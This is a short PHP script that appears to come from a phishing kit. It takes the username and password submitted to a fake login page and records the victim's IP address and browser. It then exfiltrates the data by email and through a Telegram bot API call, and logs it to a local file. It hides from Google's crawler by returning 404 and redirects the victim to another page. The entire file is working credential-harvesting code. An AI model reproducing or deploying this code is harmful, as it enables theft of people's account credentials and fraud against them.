<?php
session_start();

include('config/email.php');
if(isset($_POST['user'])){
	
	$ip = getenv("REMOTE_ADDR");
	$ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[  Online Access 2 ]---------------------#\n";
$msg .= "Username  : ".$_POST['user']."\n";
$msg .= "Password   : ".$_POST['pass']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address		: ".$ip."\n";
$msg .= "DEVICE INFORMATION		    : ".$ua."\n";
$msg .= "#-------------------[ SPY - END ]------------------------#\n\n";
$sub = "::Spy::  Online Access: $ip";
mail($to,$sub,$msg);

$apiToken = $tgbot;
$data = [
    'chat_id' => $chatid, 
    'text' => $msg,
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    



mail($ml2,$sub,$msg);
 $data = fopen("antibot.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

header('location: link.php')
?>